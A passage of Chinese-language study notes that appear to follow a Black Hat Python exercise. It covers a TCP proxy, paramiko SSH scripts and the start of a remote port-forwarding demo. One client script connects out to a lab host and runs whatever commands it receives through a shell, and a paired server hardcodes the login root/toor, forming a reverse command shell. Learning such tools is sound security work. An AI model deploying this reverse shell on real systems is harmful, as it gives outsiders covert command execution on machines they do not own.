</span></span><span class=line><span class=cl>            <span class=n>remote_socket</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] No more data. Closing connections.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>server_loop</span><span class=p>(</span><span class=n>local_host</span><span class=p>,</span> <span class=n>local_port</span><span class=p>,</span> <span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>receive_first</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>server</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>local_host</span><span class=p>,</span> <span class=n>local_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>socket</span><span class=o>.</span><span class=n>error</span> <span class=k>as</span> <span class=n>exc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!!] Failed to listen on </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>local_host</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                  <span class=n>local_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!!] Check for other listening sockets or correct &#34;</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;permissions.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!!] Caught exception error: </span><span class=si>{</span><span class=n>exc</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Listening on </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>local_host</span><span class=p>,</span> <span class=n>local_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>client_socket</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>server</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print out the local connection information</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[==&gt;] Received incoming connection from </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>addr</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># start a thread to talk to the remote host</span>
</span></span><span class=line><span class=cl>        <span class=n>proxy_thread</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>proxy_handler</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=p>,</span> <span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>,</span> <span class=n>receive_first</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>proxy_thread</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># no fancy command line parsing here</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>:])</span> <span class=o>!=</span> <span class=mi>5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: ./proxy.py [localhost] [localport] [remotehost] &#34;</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;[remoteport] [receive_first]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># setup local listening parameters</span>
</span></span><span class=line><span class=cl>    <span class=n>local_host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>local_port</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># setup remote target</span>
</span></span><span class=line><span class=cl>    <span class=n>remote_host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>remote_port</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># this tells our proxy to connect and receive data</span>
</span></span><span class=line><span class=cl>    <span class=c1># before sending to the remote host</span>
</span></span><span class=line><span class=cl>    <span class=n>receive_first</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;True&#34;</span> <span class=ow>in</span> <span class=n>receive_first</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>receive_first</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>receive_first</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># now spin up our listening socket</span>
</span></span><span class=line><span class=cl>    <span class=n>server_loop</span><span class=p>(</span><span class=n>local_host</span><span class=p>,</span> <span class=n>local_port</span><span class=p>,</span> <span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>,</span> <span class=n>receive_first</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>proxy的邏輯:
<code>=...=></code>是網路的部分，<code>-...-></code>是記憶體讀寫的部分。
開頭有大寫的是程式，開頭有底線是指令。</p><pre tabindex=0><code>Client =&gt; Proxy =&gt; Real_server

看得更細一點

Client = (proxy_ip,local_port) =&gt; ( _recv - write_buffer -&gt; _send - read_buffer -&gt;) = (server_ip,server_port) =&gt; Real_server
</code></pre><p>如果自己要玩的話，有個問題是他會先一直讀send的東西到write_buffer，但到什麼時候才要停止?
這尷尬的是client一直send卻沒有停下來的訊號，要做出這個訊號要利用<code>shutdown</code>
如下</p><pre tabindex=0><code>&gt;&gt;&gt; c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&gt;&gt;&gt; c.connect((&#39;127.0.0.1&#39;,9988))
&gt;&gt;&gt; c.send(b&#39;wow&#39;)
3
&gt;&gt;&gt; c.shutdown(socket.SHUT_WR)
&gt;&gt;&gt; s = c.recv(4096)
&gt;&gt;&gt; s
b&#39;ACK!&#39;
</code></pre><h3 id=paramiko-用python操作ssh>paramiko: 用python操作SSH<a hidden class=anchor aria-hidden=true href=#paramiko-用python操作ssh>#</a></h3><p>先啟動WSL2的sshd</p><ol><li>改<code>/etc/ssh/sshd_config</code></li></ol><pre tabindex=0><code>Port = 22
ListenAddress 0.0.0.0
PasswordAuthentication yes
</code></pre><ol start=2><li>重新啟動sshd</li></ol><pre tabindex=0><code>dpkg-reconfigure openssh-server
sudo service ssh restart 	
</code></pre><p>ssh_command.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>paramiko</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ssh_command</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>passwd</span><span class=p>,</span> <span class=n>command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SSHClient</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># client can also support using key files</span>
</span></span><span class=line><span class=cl>    <span class=c1># client.load_host_keys(&#39;/home/user/.ssh/known_hosts&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=o>.</span><span class=n>set_missing_host_key_policy</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>AutoAddPolicy</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>username</span><span class=o>=</span><span class=n>user</span><span class=p>,</span> <span class=n>password</span><span class=o>=</span><span class=n>passwd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ssh_session</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>get_transport</span><span class=p>()</span><span class=o>.</span><span class=n>open_session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ssh_session</span><span class=o>.</span><span class=n>active</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ssh_session</span><span class=o>.</span><span class=n>exec_command</span><span class=p>(</span><span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>ssh_session</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ssh_command</span><span class=p>(</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=s1>&#39;justin&#39;</span><span class=p>,</span> <span class=s1>&#39;lovesthepython&#39;</span><span class=p>,</span> <span class=s1>&#39;ls -al&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>連線的流程：</p><pre tabindex=0><code>SSHClient(new client) -&gt; connect [ip,(account, pw)] -&gt; get_transport -&gt; open_session
類比
socket (SOCK_STREAM) -&gt; connect((ip, port)) -&gt; [Nope] -&gt; accept
</code></pre><hr><p>bh_sshRcmd.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>paramiko</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ssh_command</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>passwd</span><span class=p>,</span> <span class=n>command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SSHClient</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># client can also support using key files</span>
</span></span><span class=line><span class=cl>    <span class=c1># client.load_host_keys(&#39;/home/user/.ssh/known_hosts&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=o>.</span><span class=n>set_missing_host_key_policy</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>AutoAddPolicy</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>username</span><span class=o>=</span><span class=n>user</span><span class=p>,</span> <span class=n>password</span><span class=o>=</span><span class=n>passwd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ssh_session</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>get_transport</span><span class=p>()</span><span class=o>.</span><span class=n>open_session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ssh_session</span><span class=o>.</span><span class=n>active</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ssh_session</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>command</span><span class=p>)</span><span class=c1># 這個其實可以不用</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>ssh_session</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>  <span class=c1># read banner</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>## === new ===</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># get the command from the SSH server</span>
</span></span><span class=line><span class=cl>            <span class=n>command</span> <span class=o>=</span> <span class=n>ssh_session</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>cmd_output</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>(</span><span class=n>command</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>ssh_session</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>cmd_output</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>ssh_session</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=c1>## === new end ===</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ssh_command</span><span class=p>(</span><span class=s1>&#39;192.168.100.130&#39;</span><span class=p>,</span> <span class=s1>&#39;justin&#39;</span><span class=p>,</span> <span class=s1>&#39;lovesthepython&#39;</span><span class=p>,</span> <span class=s1>&#39;ClientConnected&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>現在是在<code>bh_sshRcmd.py</code>執行指令再塞回去，這邊就是reverse tunnel的fu
不過這要能運作要配合下面的code</p><hr><p>bh_sshserver.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>paramiko</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># using the server host key from the paramiko demo files</span>
</span></span><span class=line><span class=cl><span class=n>host_key</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>RSAKey</span><span class=p>(</span><span class=n>filename</span><span class=o>=</span><span class=s1>&#39;test_rsa.key&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Server</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>ServerInterface</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>event</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_channel_request</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>kind</span><span class=p>,</span> <span class=n>chanid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>kind</span> <span class=o>==</span> <span class=s1>&#39;session&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>OPEN_SUCCEEDED</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_auth_password</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>username</span> <span class=o>==</span> <span class=s1>&#39;root&#39;</span> <span class=ow>and</span> <span class=n>password</span> <span class=o>==</span> <span class=s1>&#39;toor&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>AUTH_SUCCESSFUL</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>AUTH_FAILED</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>server</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ssh_port</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SOL_SOCKET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SO_REUSEADDR</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>server</span><span class=p>,</span> <span class=n>ssh_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Listening for connection...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Listen failed: &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Got a connection!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># noinspection PyTypeChecker</span>
</span></span><span class=line><span class=cl>    <span class=n>bhSession</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>Transport</span><span class=p>(</span><span class=n>client</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bhSession</span><span class=o>.</span><span class=n>add_server_key</span><span class=p>(</span><span class=n>host_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span> <span class=o>=</span> <span class=n>Server</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bhSession</span><span class=o>.</span><span class=n>start_server</span><span class=p>(</span><span class=n>server</span><span class=o>=</span><span class=n>server</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SSHException</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] SSH negotiation failed.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>chan</span> <span class=o>=</span> <span class=n>bhSession</span><span class=o>.</span><span class=n>accept</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Authenticated!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>chan</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span> <span class=c1># 這段其實不用</span>
</span></span><span class=line><span class=cl>    <span class=n>chan</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;Welcome to bh_ssh!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>command</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter command: &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>command</span> <span class=o>!=</span> <span class=s2>&#34;exit&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>chan</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>chan</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>chan</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;exit&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Exiting...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>bhSession</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s2>&#34;exit&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bhSession</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Caught exception: &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>bhSession</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>大概的流程是</p><ol><li>client連到server</li><li>server丟指令到client</li><li>client跑指令回傳結果</li></ol><p>這邊就是自幹reverse tunnel</p><hr><p>下面就是包好的版本
要注意到因為目的是relay sshd的東西到server
所以剛剛例子是跑指令的部分變成proxy的code</p><p>rforward.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Copyright (C) 2008  Robey Pointer &lt;robeypointer@gmail.com&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># This file is part of paramiko.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Paramiko is free software; you can redistribute it and/or modify it under the</span>
</span></span><span class=line><span class=cl><span class=c1># terms of the GNU Lesser General Public License as published by the Free</span>
</span></span><span class=line><span class=cl><span class=c1># Software Foundation; either version 2.1 of the License, or (at your option)</span>
</span></span><span class=line><span class=cl><span class=c1># any later version.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY</span>
</span></span><span class=line><span class=cl><span class=c1># WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR</span>
</span></span><span class=line><span class=cl><span class=c1># A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more</span>
</span></span><span class=line><span class=cl><span class=c1># details.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># You should have received a copy of the GNU Lesser General Public License</span>
</span></span><span class=line><span class=cl><span class=c1># along with Paramiko; if not, write to the Free Software Foundation, Inc.,</span>
</span></span><span class=line><span class=cl><span class=c1># 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Sample script showing how to do remote port forwarding over paramiko.
</span></span></span><span class=line><span class=cl><span class=s2>This script connects to the requested SSH server and sets up remote port
</span></span></span><span class=line><span class=cl><span class=s2>forwarding (the openssh -R option) from a remote port through a tunneled
</span></span></span><span class=line><span class=cl><span class=s2>connection to a destination reachable from the local machine.
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>getpass</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
